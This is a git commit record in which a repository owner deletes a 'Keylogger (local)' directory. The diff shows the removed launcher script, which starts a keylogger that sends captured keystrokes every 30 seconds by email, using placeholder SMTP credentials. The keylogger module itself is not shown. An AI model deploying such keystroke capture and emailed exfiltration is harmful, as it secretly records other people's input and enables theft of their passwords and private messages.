deb0e026f2e5342df801c8dcac8a6d1948c70eb2
Juan Brero <101221500+Juanbrero@users.noreply.github.com>
2024-05-20 22:51:38 -0300

    Delete Keylogger (local) directory

--- Keylogger (local)/execute_and_report.py
+++
@@ -1,4 +0,0 @@
-import keylogger
-
-my_keylogger = keylogger.Keylogger(time_interval= 30, email= "your-email@example.com", password= "example123", server= "smtp-mail.example.com", port=587)
-my_keylogger.start()
